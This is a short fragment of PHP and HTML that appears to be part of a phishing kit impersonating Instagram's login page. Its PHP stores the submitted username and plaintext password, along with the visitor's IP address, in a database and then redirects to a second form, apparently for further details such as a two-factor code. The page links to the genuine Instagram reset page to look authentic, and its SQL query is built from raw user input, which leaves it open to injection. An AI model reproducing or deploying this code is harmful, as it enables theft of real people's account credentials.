...
if($_POST){
    ...
    $veriyaz = $spexcon->query("INSERT INTO `users`(`id`, `user`, `pass`, `pass2`, `mail`, `no`, `faktor`, `ip`, `tarih`) VALUES (NULL,'".$username."','".$password."','Null','Null','Null','Null','".$ip."',current_timestamp())");


 
    header("Location: form2.php?username=$username");
 }
...
<button type="submit" id="imagei" class="btn">Login @<?php echo $username; ?></button>
				...
				</div><br><center><h6><font style="cursor:pointer;"onclick="javascript:window.location.href='https://www.instagram.com/accounts/password/reset/'; " color="#00376b">Did you forget your password?</font></a></h6></center></div>
...
<!--===============================================================================================-->
<script src="assets/theme/sloker2/js/main.js"></script>
